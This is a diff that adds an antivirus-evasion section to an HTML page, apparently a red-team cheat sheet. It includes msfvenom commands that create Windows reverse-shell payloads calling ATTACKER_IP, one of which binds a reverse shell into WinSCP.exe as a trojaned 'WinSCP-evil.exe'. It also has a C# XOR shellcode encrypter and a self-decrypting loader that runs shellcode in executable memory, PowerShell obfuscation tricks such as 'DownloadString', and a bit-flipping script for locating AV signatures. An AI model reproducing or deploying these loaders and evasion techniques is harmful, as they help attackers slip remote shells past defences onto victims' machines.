@@ -597,11 +597,339 @@
                           <li>convert to hex: xxd -i file.text</li>
                         </ul>
                         <h5>Encoding, Encrypting, Packing and Binding</h5>
+                        <ul>
+                          <li>Encoding</li>
+                          <ul>
+                            <li><pre><code class="language-csharp">#Likely to be flagged
+msfvenom --list encoders | grep excellent
+
+#Custom
+#payload
+msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
+
+#encoder
+
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Encrypter
+{
+    internal class Program
+    {
+        private static byte[] xor(byte[] shell, byte[] KeyBytes)
+        {
+            for (int i = 0; i < shell.Length; i++)
+            {
+                shell[i] ^= KeyBytes[i % KeyBytes.Length];
+            }
+            return shell;
+        }
+        static void Main(string[] args)
+        {
+            //XOR Key - It has to be the same in the Droppr for Decrypting
+            string key = "PassK3y123!";
+
+            //Convert Key into bytes
+            byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+
+            //Original Shellcode here (csharp format)
+            byte[] buf = new byte[460] { 0xfc,0x48,0x83,..,0xda,0xff,0xd5 };
+
+            //XORing byte by byte and saving into a new array of bytes
+            byte[] encoded = xor(buf, keyBytes);
+            Console.WriteLine(Convert.ToBase64String(encoded));        
+        }
+    }
+}
+
+#selfdecoding payload
+
+using System;
+using System.Net;
+using System.Text;
+using System.Runtime.InteropServices;
+
+public class Program {
+  [DllImport("kernel32")]
+  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+  [DllImport("kernel32")]
+  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+  [DllImport("kernel32")]
+  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+  private static UInt32 MEM_COMMIT = 0x1000;
+  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+  
+  private static byte[] xor(byte[] shell, byte[] KeyBytes)
+        {
+            for (int i = 0; i < shell.Length; i++)
+            {
+                shell[i] ^= KeyBytes[i % KeyBytes.Length];
+            }
+            return shell;
+        }
+  public static void Main()
+  {
+
+    string dataBS64 = "qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=";
+    byte[] data = Convert.FromBase64String(dataBS64);
+
+    string key = "PassK3y123!";
+    //Convert Key into bytes
+    byte[] keyBytes = Encoding.ASCII.GetBytes(key);
+
+    byte[] encoded = xor(data, keyBytes);
+
+    UInt32 codeAddr = VirtualAlloc(0, (UInt32)encoded.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    Marshal.Copy(encoded, 0, (IntPtr)(codeAddr), encoded.Length);
+
+    IntPtr threadHandle = IntPtr.Zero;
+    UInt32 threadId = 0;
+    IntPtr parameter = IntPtr.Zero;
+    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
+
+    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+  }
+}
+
+                          </code></pre></li>
+                          </ul>
+                          <li>Encryption</li>
+                          <ul>
+                            <li><pre><code class="language-bash">msfvenom --list encrypt</code></pre></li>
+                          </ul>
+                          <li>Packers</li>
+                          <ul>
+                            <li>Achieve some level of obfuscation by implementing a mixture of transforms that include compressing, encrypting, adding debugging protections and many others.</li>
+                            <li>Packed code is executed like this:</li>
+                            <ol>
+                              <li>The unpacker gets executed first, as it is the executable's entry point.</li>
+                              <li>The unpacker reads the packed application's code.</li>
+                              <li>The unpacker will write the original unpacked code somewhere in memory and direct the execution flow of the application to it.</li>
+                            </ol>
+                            <li>If the AV does in-memory scans, malicious code may be picked up.</li>
+                          </ul>
+                          <li>Binders</li>
+                          <ul>
+                            <li>Merge two (or more) executables into a single one.</li>
+                            <li>Does not evade AVs but can trick users</li>
+                            <li><pre><code class="language-bash">msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe</code></pre></li>
+                          </ul>
+                        </ul>
                       </div>
                       <h4>Obfuscation</h4>
-                      <div></div>
+                      <div>
+                        <ul>
+                          <li>Obfuscation Methods
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Obfuscation Method</th>
+                                  <th>Purpose</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Array Transformation</td>
+                                  <td>Transforms an array by splitting, merging, folding, and flattening</td>
+                                </tr>
+                                <tr>
+                                  <td>Data Encoding</td>
+                                  <td>Encodes data with mathematical functions or ciphers</td>
+                                </tr>
+                                <tr>
+                                  <td>Data Procedurization</td>
+                                  <td>Substitutes static data with procedure calls</td>
+                                </tr>
+                                <tr>
+                                  <td>Data Splitting/Merging</td>
+                                  <td>Distributes information of one variable into several new variables</td>
+                                </tr>
+                                <tr>
+                                  <td>Junk Code</td>
+                                  <td>Adds junk instructions that are non-functional, also known as code stubs</td>
+                                </tr>
+                                <tr>
+                                  <td>Separation of Related Code</td>
+                                  <td>Separates related codes or instructions to increase difficulty in reading the program</td>
+                                </tr>
+                                <tr>
+                                  <td>Stripping Redundant Symbols</td>
+                                  <td>Strips symbolic information such as debug information or other symbol tables</td>
+                                </tr>
+                                <tr>
+                                  <td>Meaningless Identifiers</td>
+                                  <td>Transforms a meaningful identifier to something meaningless</td>
+                                </tr>
+                                <tr>
+                                  <td>Implicit Controls</td>
+                                  <td>Converts explicit control instructions to implicit instructions</td>
+                                </tr>
+                                <tr>
+                                  <td>Dispatcher-based Controls</td>
+                                  <td>Determines the next block to be executed during runtime</td>
+                                </tr>
+                                <tr>
+                                  <td>Probabilistic Control Flows</td>
+                                  <td>Introduces replications of control flows with the same semantics but different syntax</td>
+                                </tr>
+                                <tr>
+                                  <td>Bogus Control Flows</td>
+                                  <td>Control flows deliberately added to a program but will never be executed</td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </li>
+                          <li>Object Concatenation
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Language</th>
+                                  <th>Concatenation Operator</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Python</td>
+                                  <td>“+”</td>
+                                </tr>
+                                <tr>
+                                  <td>PowerShell</td>
+                                  <td>“+”, ”,”, ”$”, or no operator at all</td>
+                                </tr>
+                                <tr>
+                                  <td>C#</td>
+                                  <td>“+”, “String.Join”, “String.Concat”</td>
+                                </tr>
+                                <tr>
+                                  <td>C</td>
+                                  <td>“strcat”</td>
+                                </tr>
+                                <tr>
+                                  <td>C++</td>
+                                  <td>“+”, “append”</td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </li>
+                          <li>Non-Interpreted Characters
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Character</th>
+                                  <th>Purpose</th>
+                                  <th>Example</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Breaks</td>
+                                  <td>Break a single string into multiple substrings and combine them</td>
+                                  <td>('co'+'ffe'+'e')</td>
+                                </tr>
+                                <tr>
+                                  <td>Reorders</td>
+                                  <td>Reorder a string’s components</td>
+                                  <td>('{1}{0}'-f'ffee','co')</td>
+                                </tr>
+                                <tr>
+                                  <td>Whitespace</td>
+                                  <td>Include white space that is not interpreted</td>
+                                  <td>.( 'Ne' +'w-Ob' + 'ject')</td>
+                                </tr>
+                                <tr>
+                                  <td>Ticks</td>
+                                  <td>Include ticks that are not interpreted</td>
+                                  <td>d\`own\`LoAd\`Stri\`ng</td>
+                                </tr>
+                                <tr>
+                                  <td>Random Case</td>
+                                  <td>Tokens are generally not case sensitive and can be any arbitrary case</td>
+                                  <td>dOwnLoAdsTRing</td>
+                                </tr>
+                              </tbody>
+                            </table>
+                          </li>
+                        </ul>
+                      </div>
                       <h4>Signature</h4>
-                      <div></div>
+                      <div>
+                        <ul>
+                          <li>Static Code-Based</li>
+                          <ul>
+                            <li>Obfuscation Methods
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Obfuscation Method</th>
+                                  <th>Purpose</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Method Proxy</td>
+                                  <td>Creates a proxy method or a replacement object</td>
+                                </tr>
+                                <tr>
+                                  <td>Method Scattering/Aggregation</td>
+                                  <td>Combines multiple methods into one or scatters a method into several</td>
+                                </tr>
+                                <tr>
+                                  <td>Method Clone</td>
+                                  <td>Creates replicas of a method and randomly calls each</td>
+                                </tr>
+                              </tbody>
+                            </table></li>
+                            <li>Obfuscation Classes
+                            <table>
+                              <thead>
+                                <tr>
+                                  <th>Obfuscation Method</th>
+                                  <th>Purpose</th>
+                                </tr>
+                              </thead>
+                              <tbody>
+                                <tr>
+                                  <td>Class Hierarchy Flattening</td>
+                                  <td>Create proxies for classes using interfaces</td>
+                                </tr>
+                                <tr>
+                                  <td>Class Splitting/Coalescing</td>
+                                  <td>Transfer local variables or instruction groups to another class</td>
+                                </tr>
+                                <tr>
+                                  <td>Dropping Modifiers</td>
+                                  <td>Remove class modifiers (public, private) and make all members public</td>
+                                </tr>
+                              </tbody>
+                              </table></li>
+                          </ul>
+                          <li>Static Property-Based Signatures</li>
+                          <ul>
+                            <li>Bit Flipping: <pre><code class="language-python">import sys
+
+orig = list(open(sys.argv[1], "rb").read())
+
+i = 0
+while i < len(orig):
+  current = list(orig)
+  current[i] = chr(ord(current[i]) ^ 0xde)
+  path = "%d.exe" % i
+  
+  output = "".join(str(e) for e in current)
+  open(path, "wb").write(output)
+  i += 1
+  
+print("done")</code></pre></li>
+                          </ul>
+                        </ul>
+                      </div>
                       <h4>Runtime Detection</h4>
                       <div></div>
                       <h4>Logging and Monitoring</h4>
